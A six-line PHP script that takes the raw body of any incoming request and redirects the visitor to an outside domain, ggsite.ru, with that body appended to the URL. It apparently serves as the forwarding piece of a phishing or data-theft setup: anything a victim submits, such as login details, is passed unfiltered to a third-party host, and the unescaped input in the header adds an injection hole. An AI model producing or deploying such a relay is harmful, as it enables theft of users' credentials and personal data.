<?php

$output = file_get_contents('php://input');
header('Location: http://ggsite.ru/ficom/index.php.'.$output);
	
?>